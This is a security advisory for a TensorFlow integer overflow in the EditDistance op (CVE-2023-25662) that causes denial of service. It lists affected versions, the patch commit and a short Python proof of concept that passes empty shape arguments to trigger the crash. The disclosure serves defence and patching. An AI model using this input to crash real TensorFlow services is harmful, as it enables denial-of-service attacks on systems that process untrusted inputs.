# [H] TensorFlow vulnerable to integer overflow in EditDistance

## Summary
Severity: High
Advisory: GHSA-7jvm-xxmr-v5cw
CVE: CVE-2023-25662
CWE: CWE-190
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2023-03-24
Source: https://github.com/advisories/GHSA-7jvm-xxmr-v5cw
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.11.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.11.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.11.1

## Details
### Impact
TFversion 2.11.0 //tensorflow/core/ops/array_ops.cc:1067 const Tensor* hypothesis_shape_t = c->input_tensor(2); std::vector<DimensionHandle> dims(hypothesis_shape_t->NumElements() - 1); for (int i = 0; i < dims.size(); ++i) { dims[i] = c->MakeDim(std::max(h_values(i), t_values(i))); }

if hypothesis_shape_t is empty, hypothesis_shape_t->NumElements() - 1 will be integer overflow, and the it will deadlock
```python
import tensorflow as tf
para={
    'hypothesis_indices': [[]],
    'hypothesis_values': ['tmp/'],
    'hypothesis_shape': [],
    'truth_indices': [[]],
    'truth_values': [''],
    'truth_shape': [],
    'normalize': False
    }
tf.raw_ops.EditDistance(**para)
```

### Patches
We have patched the issue in GitHub commit [08b8e18643d6dcde00890733b270ff8d9960c56c](https://github.com/tensorflow/tensorflow/commit/08b8e18643d6dcde00890733b270ff8d9960c56c).

The fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by r3pwnx

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-7jvm-xxmr-v5cw
- https://nvd.nist.gov/vuln/detail/CVE-2023-25662
- https://github.com/tensorflow/tensorflow/commit/08b8e18643d6dcde00890733b270ff8d9960c56c
- https://github.com/tensorflow/tensorflow
